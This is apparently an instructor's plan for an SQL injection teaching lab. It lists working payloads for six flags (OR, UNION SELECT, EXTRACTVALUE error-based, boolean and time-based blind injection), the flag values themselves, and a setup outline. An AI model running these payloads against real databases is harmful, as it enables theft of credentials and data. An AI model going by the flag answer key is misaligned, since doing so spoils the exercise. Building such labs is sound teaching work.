# DBS401 SQL Injection Playground — Implementation Plan

## Tables (no "flag" in any name)

**`tbl_lists`** — added `notes` column
```
list_id, list_name, list_description, notes
```

**`tbl_tasks`** — unchanged schema, 2 hidden tasks added (list_id=999)
```
task_id, task_name, task_description, list_id, priority, deadline
```

**`tbl_users`** — new
```
user_id, username, password, email, role, token
```
The `token` column holds "API tokens" that are actually the flags.

## The 6 Flags

| # | Level | Technique | Entry Point | Extraction Method |
|---|-------|-----------|-------------|-------------------|
| 1 | Easy | In-band numeric SQLi | `list-task.php?list_id=1 OR 1=1` | Dump all tasks — hidden task description contains flag |
| 2 | Easy | In-band string SQLi | `search.php?q=' OR '1'='1` | Dump all tasks — another hidden task description |
| 3 | Medium | UNION SELECT | `search.php?q=' UNION SELECT 1,username,token,4,5,6 FROM tbl_users -- -` | Cross-table UNION displays admin token in results |
| 4 | Medium | Error-based (EXTRACTVALUE) | `search.php?q=' OR EXTRACTVALUE(1, CONCAT(0x7e,(SELECT token FROM tbl_users WHERE role="admin"))) OR '1'='1` | MySQL error leaks admin token in XPATH error |
| 5 | Hard | Boolean blind | `user-check.php?id=1 AND (SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D'` | Boolean oracle — "User found" vs "User not found" |
| 6 | Hard | Time-based blind | `list-task.php?list_id=1 AND IF((SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D',SLEEP(2),0)` | ~2s delay if true, instant if false |

## Flag Values & Technique Mapping

| # | Value | Technique | Entry Point |
|---|-------|-----------|-------------|
| 1 | `DBS401{n0t_s0_h4rd_t0_f1nd}` | Numeric OR | `list-task.php?list_id=1 OR 1=1` — hidden task description (tbl_tasks) |
| 2 | `DBS401{s3Arch_n0t_s0_s3cur3}` | String OR | `search.php?q=' OR '1'='1` — hidden task description (tbl_tasks) |
| 3 | `DBS401{un10n_1s_p0w3rful}` | UNION SELECT | `search.php` — admin token from tbl_users |
| 4 | `DBS401{bl1nd_but_n0t_mute}` | Error-based | `search.php` — staff token via EXTRACTVALUE error |
| 5 | `DBS401{bl1nd_but_n0t_mute}` | Boolean blind | `user-check.php?id=` — staff token, char by char |
| 6 | `DBS401{bl1nd_but_n0t_mute}` | Time-based blind | `list-task.php?list_id=` — staff token, char by char |

## Bug Fixes Applied

| File | Fix |
|------|-----|
| `index.php:98` | Added `echo` before `SITEURL` |
| `update-task.php` | Added null check after `mysqli_fetch_assoc()` |

## Install Script (setup.sh)

The script automates everything on a fresh Debian/Ubuntu VM:

1. **Root check** — requires sudo
2. **OS detection** — supports Debian/Ubuntu
3. **Dependency install** — checks `dpkg -l` for each package, installs only missing ones:
   - `apache2`
   - `mariadb-server` + `mariadb-client`
   - `php` + `libapache2-mod-php` + `php-mysql`
   - `git`, `unzip`
4. **Start services** — Apache and MariaDB
5. **Clone repo** — from the configured GitHub URL
6. **Configure database** — create DB, user, import schema
7. **Write config** — auto-generate `config/constants.php` with credentials
8. **Set permissions** — `www-data` ownership
9. **Restart Apache**
10. **Print hints** — shows challenge URL and description for each flag
